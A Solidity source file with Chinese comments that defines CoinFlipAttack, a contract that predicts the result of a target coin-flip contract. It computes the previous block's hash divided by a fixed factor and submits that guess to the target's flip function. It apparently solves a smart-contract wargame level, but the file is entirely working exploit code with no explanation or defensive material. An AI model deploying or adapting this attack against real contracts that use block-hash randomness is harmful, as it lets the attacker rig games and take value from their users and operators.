// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711854093992224089400790102339979007062110323280820243150848;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    // 核心攻擊邏輯
    function makeGuess() public {
        // 利用當前區塊的前一個區塊 Hash 來計算答案
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }
}
